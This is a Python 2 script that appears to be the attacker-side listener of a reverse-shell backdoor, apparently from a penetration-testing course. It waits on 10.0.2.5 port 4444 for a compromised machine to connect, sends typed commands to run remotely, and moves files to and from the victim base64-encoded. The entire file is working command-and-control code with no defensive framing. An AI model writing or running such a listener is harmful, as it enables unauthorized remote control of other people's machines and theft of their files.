#!/usr/bin/python

import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for an incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self,data):
        json_data = json.dumps(data)        
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self,path,content):
        '''Method to write a file sent over the socket'''
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self,path):
        '''Method to read a file to send over the socket'''
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            #Set the command you want to enter
            command = raw_input(">> ") #this is for python 2
            command = command.split(" ")

            #if upload a file, the content is added at the end of command list
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)

            result = self.execute_remotely(command)
            if command[0] == "download":
                result = self.write_file(command[1],result)
            print(result)

my_listener = Listener("10.0.2.5",4444)
my_listener.run()
